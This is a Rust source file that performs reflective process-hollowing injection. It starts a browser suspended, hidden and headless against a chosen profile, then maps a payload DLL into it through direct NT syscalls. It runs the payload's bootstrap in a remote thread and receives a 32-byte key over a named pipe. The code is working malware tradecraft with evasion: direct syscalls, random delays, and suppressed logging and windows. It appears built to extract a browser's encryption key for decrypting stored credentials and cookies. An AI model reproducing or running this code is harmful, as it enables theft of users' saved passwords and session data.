//! Reflective process hollowing injection.

use std::ffi::c_void;
use std::mem;
use std::path::Path;
use std::time::Duration;

use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use windows::Win32::System::Threading::{
    CreateProcessW, TerminateProcess, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
    STARTUPINFOW_FLAGS,
};

use crate::ipc::PipeServer;
use crate::pe::{build_mapped_image, parse_pe, section_regions};
use crate::syscalls;

const THREAD_ALL_ACCESS: u32 = 0x001F_03FF;
const CREATE_SUSPENDED: u32 = 0x0000_0004;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

/// Mirrors `payload::BootstrapParams`.
#[repr(C)]
struct BootstrapParams {
    pipe_name: *const u16,
    image_base: *mut c_void,
    image_size: usize,
}

pub fn hollow_inject(
    browser_exe: &str,
    payload_dll: &[u8],
    profile_dir: &Path,
    pipe_tag: &str,
) -> Result<Vec<u8>, ()> {
    let pe = parse_pe(payload_dll).ok_or(())?;
    let image = build_mapped_image(payload_dll, pe.size_of_image).ok_or(())?;
    let pipe_name = format!(r"\\.\pipe\cr_{pipe_tag}");

    unsafe {
        syscalls::init();
        let mut pipe = PipeServer::create(&pipe_name).map_err(|_| ())?;

        let profile_str = profile_dir.to_string_lossy();
        let cmdline = format!(
            "\"{browser_exe}\" --headless=new --disable-gpu \
             --disable-logging --log-level=3 --silent-debug-dump \
             --disable-background-networking --disable-sync --disable-default-apps \
             --disable-features=PushMessaging,NotificationTriggers \
             --remote-debugging-port=0 --no-first-run \
             --no-default-browser-check --noerrdialogs \
             --user-data-dir=\"{profile_str}\""
        );

        let exe_w = super::wide(browser_exe);
        let mut cmd_w = super::wide(&cmdline);
        let mut si = STARTUPINFOW {
            cb: mem::size_of::<STARTUPINFOW>() as u32,
            dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
            ..Default::default()
        };
        let mut pi = PROCESS_INFORMATION::default();

        let nul_name = super::wide(&super::s_nul());
        let nul = CreateFileW(
            PCWSTR(nul_name.as_ptr()),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
        .map_err(|_| ())?;
        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            true,
            PROCESS_CREATION_FLAGS(CREATE_SUSPENDED | CREATE_NO_WINDOW),
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|_| {
            let _ = syscalls::close_handle(nul);
        })?;
        let _ = syscalls::close_handle(nul);

        let proc = pi.hProcess;
        super::random_delay_ms();

        let mut remote_base: *mut c_void = std::ptr::null_mut();
        let mut region_size = pe.size_of_image;
        let status = syscalls::nt_allocate_virtual_memory(
            proc,
            &mut remote_base,
            0,
            &mut region_size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 || remote_base.is_null() {
            cleanup_process(&pi);
            return Err(());
        }

        super::random_delay_ms();
        let mut written = 0usize;
        let status = syscalls::nt_write_virtual_memory(
            proc,
            remote_base,
            image.as_ptr() as *const c_void,
            image.len(),
            &mut written,
        );
        if status < 0 || written != image.len() {
            cleanup_process(&pi);
            return Err(());
        }

        if let Some(sections) = section_regions(payload_dll) {
            for (rva, size, prot) in sections {
                let mut base = remote_base.cast::<u8>().add(rva as usize) as *mut c_void;
                let mut sec_size = size as usize;
                let mut old = 0u32;
                let _ = syscalls::nt_protect_virtual_memory(
                    proc,
                    &mut base,
                    &mut sec_size,
                    prot,
                    &mut old,
                );
            }
        }

        let pipe_wide = super::wide(&pipe_name);
        let pipe_bytes = pipe_wide.len() * 2;
        let mut pipe_remote: *mut c_void = std::ptr::null_mut();
        let mut pipe_region = pipe_bytes;
        let status = syscalls::nt_allocate_virtual_memory(
            proc,
            &mut pipe_remote,
            0,
            &mut pipe_region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 || pipe_remote.is_null() {
            cleanup_process(&pi);
            return Err(());
        }
        let mut pipe_written = 0usize;
        let status = syscalls::nt_write_virtual_memory(
            proc,
            pipe_remote,
            pipe_wide.as_ptr() as *const c_void,
            pipe_bytes,
            &mut pipe_written,
        );
        if status < 0 || pipe_written != pipe_bytes {
            cleanup_process(&pi);
            return Err(());
        }

        let params = BootstrapParams {
            pipe_name: pipe_remote as *const u16,
            image_base: remote_base,
            image_size: pe.size_of_image,
        };
        let mut params_remote: *mut c_void = std::ptr::null_mut();
        let mut params_size = mem::size_of::<BootstrapParams>();
        let status = syscalls::nt_allocate_virtual_memory(
            proc,
            &mut params_remote,
            0,
            &mut params_size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 || params_remote.is_null() {
            cleanup_process(&pi);
            return Err(());
        }
        let mut params_written = 0usize;
        let status = syscalls::nt_write_virtual_memory(
            proc,
            params_remote,
            &params as *const _ as *const c_void,
            mem::size_of::<BootstrapParams>(),
            &mut params_written,
        );
        if status < 0 || params_written != mem::size_of::<BootstrapParams>() {
            cleanup_process(&pi);
            return Err(());
        }

        let entry = remote_base.cast::<u8>().add(pe.bootstrap_rva as usize) as *mut c_void;
        let mut thr = HANDLE::default();
        let status = syscalls::nt_create_thread_ex(
            &mut thr,
            THREAD_ALL_ACCESS,
            std::ptr::null_mut(),
            proc,
            entry,
            params_remote,
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );
        if status < 0 || thr.0.is_null() {
            cleanup_process(&pi);
            return Err(());
        }

        pipe.accept().map_err(|_| {
            cleanup_process(&pi);
            let _ = syscalls::close_handle(thr);
        })?;

        let key = match pipe.wait_for_key(Duration::from_secs(30)) {
            Ok(k) if k.len() == 32 => k,
            _ => {
                cleanup_process(&pi);
                let _ = syscalls::close_handle(thr);
                return Err(());
            }
        };

        let _ = syscalls::close_handle(thr);
        let _ = syscalls::close_handle(pi.hThread);
        TerminateProcess(proc, 0).ok();
        let _ = syscalls::close_handle(proc);

        Ok(key)
    }
}

unsafe fn cleanup_process(pi: &PROCESS_INFORMATION) {
    TerminateProcess(pi.hProcess, 1).ok();
    let _ = syscalls::close_handle(pi.hThread);
    let _ = syscalls::close_handle(pi.hProcess);
}
